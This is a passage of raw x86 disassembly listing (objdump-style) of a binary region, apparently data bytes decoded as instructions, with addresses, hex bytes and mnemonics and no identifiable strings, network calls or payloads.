  406ff5:	16                   	push   %ss
  406ff6:	2a 01                	sub    (%ecx),%al
  406ff8:	a1 02 0e 07 c3       	mov    0xc3070e02,%eax
  406ffd:	00 c1                	add    %al,%cl
  406fff:	01 c3                	add    %eax,%ebx
  407001:	18 01                	sbb    %al,(%ecx)
  407003:	05 99 02 07 15       	add    $0x15070299,%eax
  407008:	6b 01 f1             	imul   $0xfffffff1,(%ecx),%eax
  40700b:	02 db                	add    %bl,%bl
  40700d:	07                   	pop    %es
  40700e:	6b 01 a1             	imul   $0xffffffa1,(%ecx),%eax
  407011:	02 61 0d             	add    0xd(%ecx),%ah
  407014:	c3                   	ret
  407015:	00 a1 02 1e 07 c7    	add    %ah,-0x38f8e1fe(%ecx)
  40701b:	00 89 02 0b 0d 4b    	add    %cl,0x4b0d0b02(%ecx)
  407021:	02 89 02 7a 0a 4b    	add    0x4b0a7a02(%ecx),%cl
  407027:	02 59 01             	add    0x1(%ecx),%bl
  40702a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40702b:	1b 3e                	sbb    (%esi),%edi
  40702d:	01 59 01             	add    %ebx,0x1(%ecx)
  407030:	51                   	push   %ecx
  407031:	1d c3 00 a1 02       	sbb    $0x2a100c3,%eax
  407036:	6a 1b                	push   $0x1b
  407038:	c7 00 f9 02 07 15    	movl   $0x150702f9,(%eax)
  40703e:	6b 01 f9             	imul   $0xfffffff9,(%ecx),%eax
  407041:	02 0e                	add    (%esi),%cl
  407043:	0b 23                	or     (%ebx),%esp
  407045:	02 01                	add    (%ecx),%al
  407047:	03 07                	add    (%edi),%eax
  407049:	15 0e 00 01 03       	adc    $0x301000e,%eax
  40704e:	50                   	push   %eax
  40704f:	07                   	pop    %es
  407050:	47                   	inc    %edi
  407051:	02 c1                	add    %cl,%al
  407053:	01 9b 14 47 02 c1    	add    %ebx,-0x3efdb8ec(%ebx)
  407059:	01 c5                	add    %eax,%ebp
  40705b:	17                   	pop    %ss
  40705c:	42                   	inc    %edx
  40705d:	02 09                	add    (%ecx),%cl
  40705f:	03 07                	add    (%edi),%eax
  407061:	15 6b 01 09 03       	adc    $0x309016b,%eax
  407066:	60                   	pusha
  407067:	19 6a 05             	sbb    %ebp,0x5(%edx)
  40706a:	11 03                	adc    %eax,(%ebx)
  40706c:	ef                   	out    %eax,(%dx)
  40706d:	14 70                	adc    $0x70,%al
  40706f:	05 19 03 f0 1a       	add    $0x1af00319,%eax
  407074:	76 05                	jbe    0x40707b
  407076:	21 03                	and    %eax,(%ebx)
  407078:	d7                   	xlat   %ds:(%ebx)
  407079:	0f 7c                	(bad)
  40707b:	05 c1 01 0c 1a       	add    $0x1a0c01c1,%eax
  407080:	47                   	inc    %edi
  407081:	02 19                	add    (%ecx),%bl
  407083:	03 dc                	add    %esp,%ebx
  407085:	1b bf 01 81 02 d1    	sbb    -0x2efd7eff(%edi),%edi
  40708b:	05 86 05 29 03       	add    $0x3290586,%eax
  407090:	6e                   	outsb  %ds:(%esi),(%dx)
  407091:	00 f4                	add    %dh,%ah
  407093:	01 59 01             	add    %ebx,0x1(%ecx)
  407096:	51                   	push   %ecx
  407097:	1b 7b 00             	sbb    0x0(%ebx),%edi
  40709a:	59                   	pop    %ecx
  40709b:	01 7e 07             	add    %edi,0x7(%esi)
  40709e:	c3                   	ret
  40709f:	00 59 01             	add    %bl,0x1(%ecx)
  4070a2:	40                   	inc    %eax
  4070a3:	07                   	pop    %es
  4070a4:	c3                   	ret
  4070a5:	00 59 01             	add    %bl,0x1(%ecx)
  4070a8:	06                   	push   %es
  4070a9:	11 93 05 c1 01 c3    	adc    %edx,-0x3cfe3efb(%ebx)
  4070af:	18 99 05 49 03 07    	sbb    %bl,0x7034905(%ecx)
  4070b5:	15 0e 00 61 01       	adc    $0x161000e,%eax
  4070ba:	5b                   	pop    %ebx
  4070bb:	02 cd                	add    %ch,%cl
  4070bd:	03 51 03             	add    0x3(%ecx),%edx
  4070c0:	1f                   	pop    %ds
  4070c1:	0d 75 01 69 00       	or     $0x690175,%eax
  4070c6:	07                   	pop    %es
  4070c7:	15 0e 00 21 02       	adc    $0x221000e,%eax
  4070cc:	6c                   	insb   (%dx),%es:(%edi)
  4070cd:	0c 70                	or     $0x70,%al
  4070cf:	01 69 00             	add    %ebp,0x0(%ecx)
  4070d2:	d2 04 aa             	rolb   %cl,(%edx,%ebp,4)
  4070d5:	05 c1 01 d0 0c       	add    $0xcd001c1,%eax
  4070da:	b0 05                	mov    $0x5,%al
  4070dc:	c1 01 49             	roll   $0x49,(%ecx)
  4070df:	14 47                	adc    $0x47,%al
  4070e1:	02 c1                	add    %cl,%al
  4070e3:	01 eb                	add    %ebp,%ebx
  4070e5:	04 bd                	add    $0xbd,%al
  4070e7:	05 59 01 e0 0f       	add    $0xfe00159,%eax
  4070ec:	1d 00 61 03 6c       	sbb    $0x6c036100,%eax
  4070f1:	0c 47                	or     $0x47,%al
  4070f3:	02 69 03             	add    0x3(%ecx),%ch
  4070f6:	4e                   	dec    %esi
  4070f7:	0d c3 00 b1 02       	or     $0x2b100c3,%eax
  4070fc:	b9 07 c3 05 59       	mov    $0x5905c307,%ecx
  407101:	03 cb                	add    %ebx,%ecx
  407103:	07                   	pop    %es
  407104:	c3                   	ret
  407105:	05 59 03 6c 0c       	add    $0xc6c0359,%eax
  40710a:	47                   	inc    %edi
  40710b:	02 71 03             	add    0x3(%ecx),%dh
  40710e:	fc                   	cld
  40710f:	1a c9                	sbb    %cl,%cl
  407111:	05 79 03 07 15       	add    $0x15070379,%eax
  407116:	cf                   	iret
  407117:	05 79 03 7a 06       	add    $0x67a0379,%eax
  40711c:	d6                   	salc
  40711d:	05 c1 00 67 08       	add    $0x86700c1,%eax
  407122:	0e                   	push   %cs
  407123:	00 19                	add    %bl,(%ecx)
  407125:	00 67 08             	add    %ah,0x8(%edi)
  407128:	0e                   	push   %cs
  407129:	00 09                	add    %cl,(%ecx)
  40712b:	03 07                	add    (%edi),%eax
  40712d:	15 36 02 0c 00       	adc    $0xc0236,%eax
  407132:	07                   	pop    %es
  407133:	15 0e 00 0c 00       	adc    $0xc000e,%eax
  407138:	2b 03                	sub    (%ebx),%eax
  40713a:	f5                   	cmc
  40713b:	05 0c 00 47 1b       	add    $0x1b47000c,%eax
  407140:	f4                   	hlt
  407141:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  407144:	78 1c                	js     0x407162
  407146:	fb                   	sti
  407147:	05 c1 01 e5 10       	add    $0x10e501c1,%eax
  40714c:	01 06                	add    %eax,(%esi)
  40714e:	51                   	push   %ecx
  40714f:	00 f4                	add    %dh,%ah
  407151:	17                   	pop    %ss
  407152:	11 06                	adc    %eax,(%esi)
  407154:	51                   	push   %ecx
  407155:	00 fd                	add    %bh,%ch
  407157:	01 17                	add    %edx,(%edi)
  407159:	06                   	push   %es
  40715a:	59                   	pop    %ecx
  40715b:	00 74 03 17          	add    %dh,0x17(%ebx,%eax,1)
  40715f:	06                   	push   %es
  407160:	89 03                	mov    %eax,(%ebx)
  407162:	71 1d                	jno    0x407181
  407164:	1d 06 69 00 07       	sbb    $0x7006906,%eax
  407169:	15 01 03 61 00       	adc    $0x610301,%eax
  40716e:	07                   	pop    %es
  40716f:	15 2d 06 91 03       	adc    $0x391062d,%eax
  407174:	67 08 0e 00 99       	or     %cl,-0x6700
  407179:	03 07                	add    (%edi),%eax
  40717b:	15 56 04 a1 03       	adc    $0x3a10456,%eax
  407180:	bb 0b 35 06 81       	mov    $0x8106350b,%ebx
  407185:	02 20                	add    (%eax),%ah
  407187:	05 0a 00 91 02       	add    $0x291000a,%eax
  40718c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40718d:	1c 35                	sbb    $0x35,%al
  40718f:	05 91 02 c1 0a       	add    $0xac10291,%eax
  407194:	43                   	inc    %ebx
  407195:	06                   	push   %es
  407196:	89 01                	mov    %eax,(%ecx)
  407198:	82 05 47 02 91 02 a7 	addb   $0xa7,0x2910247
  40719f:	1c 54                	sbb    $0x54,%al
  4071a1:	06                   	push   %es
  4071a2:	91                   	xchg   %eax,%ecx
  4071a3:	02 b8 0a 7c 05 91    	add    -0x6efa83f6(%eax),%bh
  4071a9:	02 a1 0a 6b 01 91    	add    -0x6efe94f6(%ecx),%ah
  4071af:	02 c1                	add    %cl,%al
  4071b1:	1c 5e                	sbb    $0x5e,%al
  4071b3:	06                   	push   %es
  4071b4:	91                   	xchg   %eax,%ecx
  4071b5:	02 71 05             	add    0x5(%ecx),%dh
  4071b8:	6b 01 1c             	imul   $0x1c,(%ecx),%eax
  4071bb:	00 2b                	add    %ch,(%ebx)
  4071bd:	03 f5                	add    %ebp,%esi
  4071bf:	05 b9 03 b0 1b       	add    $0x1bb003b9,%eax
  4071c4:	7c 06                	jl     0x4071cc
  4071c6:	1c 00                	sbb    $0x0,%al
  4071c8:	ef                   	out    %eax,(%dx)
  4071c9:	14 92                	adc    $0x92,%al
  4071cb:	06                   	push   %es
  4071cc:	24 00                	and    $0x0,%al
  4071ce:	f0 1a a4 06 1c 00 ec 	lock sbb 0xaec001c(%esi,%eax,1),%ah
  4071d5:	0a 
  4071d6:	a9 06 24 00 dc       	test   $0xdc002406,%eax
  4071db:	1b bf 01 c9 03 c2    	sbb    -0x3dfc36ff(%edi),%edi
  4071e1:	10 b3 06 c9 03 21    	adc    %dh,0x2103c906(%ebx)
  4071e7:	03 b9 06 d1 03 2e    	add    0x2e03d106(%ecx),%edi
  4071ed:	08 c1                	or     %al,%cl
  4071ef:	06                   	push   %es
  4071f0:	e1 03                	loope  0x4071f5
  4071f2:	f3 04 c8             	repz add $0xc8,%al
  4071f5:	06                   	push   %es
  4071f6:	d9 03                	flds   (%ebx)
  4071f8:	11 06                	adc    %eax,(%esi)
  4071fa:	cf                   	iret
  4071fb:	06                   	push   %es
  4071fc:	f1                   	int1
  4071fd:	03 bc 08 d8 06 01 04 	add    0x40106d8(%eax,%ecx,1),%edi
  407204:	d7                   	xlat   %ds:(%ebx)
  407205:	12 e2                	adc    %dl,%ah
  407207:	06                   	push   %es
  407208:	2c 00                	sub    $0x0,%al
  40720a:	bc 08 17 07 2c       	mov    $0x2c071708,%esp
  40720f:	00 73 19             	add    %dh,0x19(%ebx)
  407212:	23 07                	and    (%edi),%eax
  407214:	34 00                	xor    $0x0,%al
  407216:	9e                   	sahf
  407217:	05 3b 07 1c 00       	add    $0x1c073b,%eax
  40721c:	07                   	pop    %es
  40721d:	15 0e 00 c1 01       	adc    $0x1c1000e,%eax
  407222:	af                   	scas   %es:(%edi),%eax
  407223:	1d 84 00 21 04       	sbb    $0x4210084,%eax
  407228:	07                   	pop    %es
  407229:	15 6b 01 19 04       	adc    $0x419016b,%eax
  40722e:	07                   	pop    %es
  40722f:	15 59 07 29 04       	adc    $0x4290759,%eax
  407234:	bb 16 61 07 51       	mov    $0x51076116,%ebx
  407239:	01 37                	add    %esi,(%edi)
  40723b:	0c 93                	or     $0x93,%al
  40723d:	01 49 04             	add    %ecx,0x4(%ecx)
  407240:	07                   	pop    %es
  407241:	15 6b 01 59 02       	adc    $0x259016b,%eax
  407246:	07                   	pop    %es
  407247:	15 0e 00 31 04       	adc    $0x431000e,%eax
  40724c:	07                   	pop    %es
  40724d:	15 0e 00 51 04       	adc    $0x451000e,%eax
  407252:	63 0b                	arpl   %ecx,(%ebx)
  407254:	01 03                	add    %eax,(%ebx)
  407256:	51                   	push   %ecx
  407257:	04 00                	add    $0x0,%al
  407259:	0b 01                	or     (%ecx),%eax
  40725b:	03 51 04             	add    0x4(%ecx),%edx
  40725e:	02 05 7a 07 51 04    	add    0x451077a,%al
  407264:	af                   	scas   %es:(%edi),%eax
  407265:	0b 81 07 51 04 9f    	or     -0x60fbaef9(%ecx),%eax
  40726b:	1c 2b                	sbb    $0x2b,%al
  40726d:	02 51 04             	add    0x4(%ecx),%dl
  407270:	95                   	xchg   %eax,%ebp
  407271:	02 0e                	add    (%esi),%cl
  407273:	00 51 04             	add    %dl,0x4(%ecx)
  407276:	2c 15                	sub    $0x15,%al
  407278:	88 07                	mov    %al,(%edi)
  40727a:	39 04 07             	cmp    %eax,(%edi,%eax,1)
  40727d:	15 8e 07 51 04       	adc    $0x451078e,%eax
  407282:	87 02                	xchg   %eax,(%edx)
  407284:	31 02                	xor    %eax,(%edx)
  407286:	39 04 52             	cmp    %eax,(%edx,%edx,2)
  407289:	0e                   	push   %cs
  40728a:	0e                   	push   %cs
  40728b:	00 41 04             	add    %al,0x4(%ecx)
  40728e:	07                   	pop    %es
  40728f:	15 2b 02 59 02       	adc    $0x259022b,%eax
  407294:	78 1c                	js     0x4072b2
  407296:	31 02                	xor    %eax,(%edx)
  407298:	51                   	push   %ecx
  407299:	03 1f                	add    (%edi),%ebx
  40729b:	0d 9a 07 79 04       	or     $0x479079a,%eax
  4072a0:	07                   	pop    %es
  4072a1:	15 6b 01 51 04       	adc    $0x451016b,%eax
  4072a6:	8e 02                	mov    (%edx),%es
  4072a8:	2b 02                	sub    (%edx),%eax
  4072aa:	51                   	push   %ecx
  4072ab:	04 1c                	add    $0x1c,%al
  4072ad:	15 88 07 c1 00       	adc    $0xc10788,%eax
  4072b2:	83 0d 23 02 81 04 32 	orl    $0x32,0x4810223
  4072b9:	1d be 07 91 04       	sbb    $0x49107be,%eax
  4072be:	5b                   	pop    %ebx
  4072bf:	1c d0                	sbb    $0xd0,%al
  4072c1:	07                   	pop    %es
  4072c2:	a1 04 07 15 0e       	mov    0xe150704,%eax
  4072c7:	00 c1                	add    %al,%cl
  4072c9:	01 cf                	add    %ecx,%edi
  4072cb:	18 f9                	sbb    %bh,%cl
  4072cd:	07                   	pop    %es
  4072ce:	49                   	dec    %ecx
  4072cf:	02 bb 16 99 01 49    	add    0x49019916(%ebx),%bh
  4072d5:	02 bb 16 ab 01 a9    	add    -0x56fe54ea(%ebx),%bh
  4072db:	00 07                	add    %al,(%edi)
  4072dd:	15 0e 00 1c 00       	adc    $0x1c000e,%eax
  4072e2:	d7                   	xlat   %ds:(%ebx)
  4072e3:	0f 06                	clts
  4072e5:	08 1c 00             	or     %bl,(%eax,%eax,1)
  4072e8:	47                   	inc    %edi
  4072e9:	1b f4                	sbb    %esp,%esi
  4072eb:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  4072ee:	cc                   	int3
  4072ef:	12 0e                	adc    (%esi),%cl
  4072f1:	00 c1                	add    %al,%cl
  4072f3:	01 78 17             	add    %edi,0x17(%eax)
  4072f6:	42                   	inc    %edx
  4072f7:	02 c1                	add    %cl,%al
  4072f9:	00 97 0a 28 08 49    	add    %dl,0x4908280a(%edi)
  4072ff:	02 bb 16 a5 01 51    	add    0x5101a516(%ebx),%bh
  407305:	01 ad 00 32 08 c1    	add    %ebp,-0x3ef7ce00(%ebp)
  40730b:	01 41 10             	add    %eax,0x10(%ecx)
  40730e:	47                   	inc    %edi
  40730f:	02 a9 04 75 08 37    	add    0x37087504(%ecx),%ch
  407315:	08 51 01             	or     %dl,0x1(%ecx)
  407318:	ad                   	lods   %ds:(%esi),%eax
  407319:	00 3c 08             	add    %bh,(%eax,%ecx,1)
  40731c:	51                   	push   %ecx
  40731d:	01 ad 00 41 08 51    	add    %ebp,0x51084100(%ebp)
  407323:	01 ad 00 46 08 51    	add    %ebp,0x51084600(%ebp)
  407329:	01 ce                	add    %ecx,%esi
  40732b:	00 4d 08             	add    %cl,0x8(%ebp)
  40732e:	41                   	inc    %ecx
  40732f:	03 75 08             	add    0x8(%ebp),%esi
  407332:	52                   	push   %edx
  407333:	08 51 01             	or     %dl,0x1(%ecx)
  407336:	ce                   	into
  407337:	00 57 08             	add    %dl,0x8(%edi)
  40733a:	51                   	push   %ecx
  40733b:	01 ce                	add    %ecx,%esi
  40733d:	00 5c 08 51          	add    %bl,0x51(%eax,%ecx,1)
  407341:	01 ce                	add    %ecx,%esi
  407343:	00 61 08             	add    %ah,0x8(%ecx)
  407346:	51                   	push   %ecx
  407347:	01 bd 05 68 08 b1    	add    %edi,-0x4ef797fb(%ebp)
  40734d:	04 75                	add    $0x75,%al
  40734f:	08 6d 08             	or     %ch,0x8(%ebp)
  407352:	49                   	dec    %ecx
  407353:	02 bb 16 7a 08 59    	add    0x59087a16(%ebx),%bh
  407359:	03 48 1d             	add    0x1d(%eax),%ecx
  40735c:	23 02                	and    (%edx),%eax
  40735e:	e1 02                	loope  0x407362
  407360:	07                   	pop    %es
  407361:	15 88 08 c1 00       	adc    $0xc10888,%eax
  407366:	8e 0a                	mov    (%edx),%cs
  407368:	f4                   	hlt
  407369:	01 89 01 07 15 6b    	add    %ecx,0x6b150701(%ecx)
  40736f:	01 49 02             	add    %ecx,0x2(%ecx)
  407372:	e0 00                	loopne 0x407374
  407374:	b6 08                	mov    $0x8,%dh
  407376:	49                   	dec    %ecx
  407377:	02 3a                	add    (%edx),%bh
  407379:	06                   	push   %es
  40737a:	bd 08 49 02 bd       	mov    $0xbd024908,%ebp
  40737f:	05 c4 08 49 02       	add    $0x24908c4,%eax
  407384:	65 00 cb             	gs add %cl,%bl
  407387:	08 49 02             	or     %cl,0x2(%ecx)
  40738a:	ad                   	lods   %ds:(%esi),%eax
  40738b:	00 d2                	add    %dl,%dl
  40738d:	08 49 02             	or     %cl,0x2(%ecx)
  407390:	e9 00 d9 08 49       	jmp    0x49494c95
  407395:	02 ce                	add    %dh,%cl
  407397:	00 e0                	add    %ah,%al
  407399:	08 49 02             	or     %cl,0x2(%ecx)
  40739c:	bb 16 12 09 d1       	mov    $0xd1091216,%ebx
  4073a1:	04 07                	add    $0x7,%al
  4073a3:	15 28 09 09 00       	adc    $0x90928,%eax
  4073a8:	80 00 0d             	addb   $0xd,(%eax)
  4073ab:	01 09                	add    %ecx,(%ecx)
  4073ad:	00 84 00 12 01 09 00 	add    %al,0x90112(%eax,%eax,1)
  4073b4:	88 00                	mov    %al,(%eax)
  4073b6:	17                   	pop    %ss
  4073b7:	01 08                	add    %ecx,(%eax)
  4073b9:	00 98 00 5c 01 08    	add    %bl,0x8015c00(%eax)
  4073bf:	00 9c 00 61 01 08 00 	add    %bl,0x80161(%eax,%eax,1)
  4073c6:	a0 00 66 01 08       	mov    0x8016600,%al
  4073cb:	00 a4 00 5c 01 08 00 	add    %ah,0x8015c(%eax,%eax,1)
  4073d2:	ec                   	in     (%dx),%al
  4073d3:	00 7f 02             	add    %bh,0x2(%edi)
  4073d6:	08 00                	or     %al,(%eax)
  4073d8:	f0 00 17             	lock add %dl,(%edi)
  4073db:	01 08                	add    %ecx,(%eax)
  4073dd:	00 f4                	add    %dh,%ah
  4073df:	00 12                	add    %dl,(%edx)
  4073e1:	01 08                	add    %ecx,(%eax)
  4073e3:	00 f8                	add    %bh,%al
  4073e5:	00 84 02 08 00 fc 00 	add    %al,0xfc0008(%edx,%eax,1)
  4073ec:	89 02                	mov    %eax,(%edx)
  4073ee:	08 00                	or     %al,(%eax)
  4073f0:	00 01                	add    %al,(%ecx)
  4073f2:	8e 02                	mov    (%edx),%es
  4073f4:	08 00                	or     %al,(%eax)
  4073f6:	04 01                	add    $0x1,%al
  4073f8:	93                   	xchg   %eax,%ebx
  4073f9:	02 08                	add    (%eax),%cl
  4073fb:	00 08                	add    %cl,(%eax)
  4073fd:	01 98 02 08 00 0c    	add    %ebx,0xc000802(%eax)
  407403:	01 9d 02 08 00 10    	add    %ebx,0x10000802(%ebp)
  407409:	01 a2 02 08 00 14    	add    %esp,0x14000802(%edx)
  40740f:	01 a7 02 08 00 18    	add    %esp,0x18000802(%edi)
  407415:	01 ac 02 2e 00 2b 00 	add    %ebp,0x2b002e(%edx,%eax,1)
  40741c:	06                   	push   %es
  40741d:	03 2e                	add    (%esi),%ebp
  40741f:	00 33                	add    %dh,(%ebx)
  407421:	00 0f                	add    %cl,(%edi)
  407423:	03 2e                	add    (%esi),%ebp
  407425:	00 3b                	add    %bh,(%ebx)
  407427:	00 34 03             	add    %dh,(%ebx,%eax,1)
  40742a:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  40742e:	3d 03 2e 00 4b       	cmp    $0x4b002e03,%eax
  407433:	00 3d 03 2e 00 53    	add    %bh,0x53002e03
  407439:	00 3d 03 2e 00 5b    	add    %bh,0x5b002e03
  40743f:	00 3d 03 2e 00 63    	add    %bh,0x63002e03
  407445:	00 3d 03 2e 00 6b    	add    %bh,0x6b002e03
  40744b:	00 3d 03 2e 00 73    	add    %bh,0x73002e03
  407451:	00 3d 03 2e 00 7b    	add    %bh,0x7b002e03
  407457:	00 43 03             	add    %al,0x3(%ebx)
  40745a:	2e 00 83 00 50 03 2e 	add    %al,%cs:0x2e035000(%ebx)
  407461:	00 8b 00 3d 03 c0    	add    %cl,-0x3ffcc300(%ebx)
  407467:	00 93 00 17 01 e0    	add    %dl,-0x1ffee900(%ebx)
  40746d:	00 93 00 17 01 00    	add    %dl,0x11700(%ebx)
  407473:	01 93 00 17 01 20    	add    %edx,0x20011700(%ebx)
  407479:	01 93 00 17 01 40    	add    %edx,0x40011700(%ebx)
  40747f:	01 93 00 17 01 60    	add    %edx,0x60011700(%ebx)
  407485:	01 93 00 17 01 80    	add    %edx,-0x7ffee900(%ebx)
  40748b:	01 93 00 17 01 a0    	add    %edx,-0x5ffee900(%ebx)
  407491:	01 93 00 17 01 c0    	add    %edx,-0x3ffee900(%ebx)
  407497:	01 93 00 17 01 e0    	add    %edx,-0x1ffee900(%ebx)
  40749d:	01 93 00 17 01 00    	add    %edx,0x11700(%ebx)
  4074a3:	02 93 00 17 01 03    	add    0x3011700(%ebx),%dl
  4074a9:	02 93 00 17 01 20    	add    0x20011700(%ebx),%dl
  4074af:	02 93 00 17 01 40    	add    0x40011700(%ebx),%dl
  4074b5:	02 93 00 17 01 60    	add    0x60011700(%ebx),%dl
  4074bb:	02 93 00 17 01 61    	add    0x61011700(%ebx),%dl
  4074c1:	02 93 00 17 01 63    	add    0x63011700(%ebx),%dl
  4074c7:	02 93 00 17 01 80    	add    -0x7ffee900(%ebx),%dl
  4074cd:	02 93 00 17 01 81    	add    -0x7efee900(%ebx),%dl
  4074d3:	02 93 00 17 01 a0    	add    -0x5ffee900(%ebx),%dl
  4074d9:	02 93 00 17 01 a1    	add    -0x5efee900(%ebx),%dl
  4074df:	02 93 00 17 01 c0    	add    -0x3ffee900(%ebx),%dl
  4074e5:	02 93 00 17 01 c1    	add    -0x3efee900(%ebx),%dl
  4074eb:	02 93 00 17 01 e0    	add    -0x1ffee900(%ebx),%dl
  4074f1:	02 93 00 17 01 e1    	add    -0x1efee900(%ebx),%dl
  4074f7:	02 93 00 17 01 e3    	add    -0x1cfee900(%ebx),%dl
  4074fd:	02 9b 00 b6 03 00    	add    0x3b600(%ebx),%bl
  407503:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  407509:	03 93 00 17 01 20    	add    0x20011700(%ebx),%edx
  40750f:	03 93 00 17 01 21    	add    0x21011700(%ebx),%edx
  407515:	03 93 00 17 01 40    	add    0x40011700(%ebx),%edx
  40751b:	03 93 00 17 01 41    	add    0x41011700(%ebx),%edx
  407521:	03 93 00 17 01 61    	add    0x61011700(%ebx),%edx
  407527:	03 93 00 17 01 81    	add    -0x7efee900(%ebx),%edx
  40752d:	03 93 00 17 01 a1    	add    -0x5efee900(%ebx),%edx
  407533:	03 93 00 17 01 a3    	add    -0x5cfee900(%ebx),%edx
  407539:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  40753f:	00 20                	add    %ah,(%eax)
  407541:	00 00                	add    %al,(%eax)
  407543:	00 14 00             	add    %dl,(%eax,%eax,1)
  407546:	01 00                	add    %eax,(%eax)
  407548:	06                   	push   %es
  407549:	00 00                	add    %al,(%eax)
  40754b:	00 1e                	add    %bl,(%esi)
  40754d:	00 c0                	add    %al,%al
  40754f:	03 c9                	add    %ecx,%ecx
  407551:	03 f4                	add    %esp,%esi
  407553:	03 9c 04 c2 04 e6 04 	add    0x4e604c2(%esp,%eax,1),%ebx
  40755a:	54                   	push   %esp
  40755b:	05 59 05 81 05       	add    $0x5810559,%eax
  407560:	8a 05 8f 05 9f 05    	mov    0x59f058f,%al
  407566:	b6 05                	mov    $0x5,%dh
  407568:	dd 05 08 06 27 06    	fldl   0x6270608
  40756e:	3c 06                	cmp    $0x6,%al
  407570:	4c                   	dec    %esp
  407571:	06                   	push   %es
  407572:	66 06                	pushw  %es
  407574:	af                   	scas   %es:(%edi),%eax
  407575:	06                   	push   %es
  407576:	53                   	push   %ebx
  407577:	07                   	pop    %es
  407578:	67 07                	addr16 pop %es
  40757a:	a3 07 cb 07 da       	mov    %eax,0xda07cb07
  40757f:	07                   	pop    %es
  407580:	e8 07 f0 07 ff       	call   0xff48658c
  407585:	07                   	pop    %es
  407586:	0c 08                	or     $0x8,%al
  407588:	11 08                	adc    %ecx,(%eax)
  40758a:	20 08                	and    %cl,(%eax)
  40758c:	2d 08 72 08 80       	sub    $0x80087208,%eax
  407591:	08 96 08 a2 08 a8    	or     %dl,-0x57f75df8(%esi)
  407597:	08 ae 08 e7 08 f1    	or     %ch,-0xef718f8(%esi)
  40759d:	08 f7                	or     %dh,%bh
  40759f:	08 fc                	or     %bh,%ah
  4075a1:	08 02                	or     %al,(%edx)
  4075a3:	09 0b                	or     %ecx,(%ebx)
  4075a5:	09 18                	or     %ebx,(%eax)
  4075a7:	09 31                	or     %esi,(%ecx)
  4075a9:	09 04 00             	or     %eax,(%eax,%eax,1)
  4075ac:	01 00                	add    %eax,(%eax)
  4075ae:	16                   	push   %ss
  4075af:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4075b2:	17                   	pop    %ss
  4075b3:	00 0d 00 18 00 0f    	add    %cl,0xf001800
  4075b9:	00 00                	add    %al,(%eax)
  4075bb:	00 66 1a             	add    %ah,0x1a(%esi)
  4075be:	9f                   	lahf
  4075bf:	00 00                	add    %al,(%eax)
  4075c1:	00 4a 1a             	add    %cl,0x1a(%edx)
  4075c4:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4075c5:	00 00                	add    %al,(%eax)
  4075c7:	00 a3 13 a9 00 00    	add    %ah,0xa913(%ebx)
  4075cd:	00 2f                	add    %ch,(%edi)
  4075cf:	0b ae 00 00 00 e0    	or     -0x20000000(%esi),%ebp
  4075d5:	19 ae 00 00 00 e2    	sbb    %ebp,-0x1e000000(%esi)
  4075db:	0a b2 00 00 00 5f    	or     0x5f000000(%edx),%dh
  4075e1:	03 b7 00 00 00 ff    	add    -0x1000000(%edi),%esi
  4075e7:	02 bb 00 00 00 99    	add    -0x67000000(%ebx),%bh
  4075ed:	0b b2 00 00 00 03    	or     0x3000000(%edx),%esi
  4075f3:	0f bf 00             	movswl (%eax),%eax
  4075f6:	00 00                	add    %al,(%eax)
  4075f8:	fe 0c b7             	decb   (%edi,%esi,4)
  4075fb:	00 00                	add    %al,(%eax)
  4075fd:	00 aa 1a c3 01 00    	add    %ch,0x1c31a(%edx)
  407603:	00 db                	add    %bl,%bl
  407605:	0f f8 01             	psubb  (%ecx),%mm0
  407608:	00 00                	add    %al,(%eax)
  40760a:	9e                   	sahf
  40760b:	0d fe 01 00 00       	or     $0x1fe,%eax
  407610:	ac                   	lods   %ds:(%esi),%al
  407611:	0c 69                	or     $0x69,%al
  407613:	02 00                	add    (%eax),%al
  407615:	00 e3                	add    %ah,%bl
  407617:	13 6d 02             	adc    0x2(%ebp),%ebp
  40761a:	00 00                	add    %al,(%eax)
  40761c:	0e                   	push   %cs
  40761d:	19 71 02             	sbb    %esi,0x2(%ecx)
  407620:	00 00                	add    %al,(%eax)
  407622:	8f                   	(bad)
  407623:	1c 75                	sbb    $0x75,%al
  407625:	02 00                	add    (%eax),%al
  407627:	00 01                	add    %al,(%ecx)
  407629:	08 7a 02             	or     %bh,0x2(%edx)
  40762c:	02 00                	add    (%eax),%al
  40762e:	06                   	push   %es
  40762f:	00 03                	add    %al,(%ebx)
  407631:	00 01                	add    %al,(%ecx)
  407633:	00 07                	add    %al,(%edi)
  407635:	00 03                	add    %al,(%ebx)
  407637:	00 02                	add    %al,(%edx)
  407639:	00 08                	add    %cl,(%eax)
  40763b:	00 05 00 01 00 09    	add    %al,0x9000100
  407641:	00 05 00 02 00 0a    	add    %al,0xa000200
  407647:	00 07                	add    %al,(%edi)
  407649:	00 01                	add    %al,(%ecx)
  40764b:	00 0b                	add    %cl,(%ebx)
  40764d:	00 07                	add    %al,(%edi)
  40764f:	00 02                	add    %al,(%edx)
  407651:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407654:	09 00                	or     %eax,(%eax)
  407656:	01 00                	add    %eax,(%eax)
  407658:	0d 00 09 00 02       	or     $0x2000900,%eax
  40765d:	00 0e                	add    %cl,(%esi)
  40765f:	00 0b                	add    %cl,(%ebx)
  407661:	00 01                	add    %al,(%ecx)
  407663:	00 0f                	add    %cl,(%edi)
  407665:	00 0b                	add    %cl,(%ebx)
  407667:	00 02                	add    %al,(%edx)
  407669:	00 10                	add    %dl,(%eax)
  40766b:	00 0d 00 01 00 11    	add    %cl,0x11000100
  407671:	00 0d 00 02 00 12    	add    %cl,0x12000200
  407677:	00 0f                	add    %cl,(%edi)
  407679:	00 01                	add    %al,(%ecx)
  40767b:	00 13                	add    %dl,(%ebx)
  40767d:	00 0f                	add    %cl,(%edi)
  40767f:	00 02                	add    %al,(%edx)
  407681:	00 14 00             	add    %dl,(%eax,%eax,1)
  407684:	11 00                	adc    %eax,(%eax)
  407686:	02 00                	add    (%eax),%al
  407688:	15 00 13 00 01       	adc    $0x1001300,%eax
  40768d:	00 16                	add    %dl,(%esi)
  40768f:	00 13                	add    %dl,(%ebx)
  407691:	00 02                	add    %al,(%edx)
  407693:	00 17                	add    %dl,(%edi)
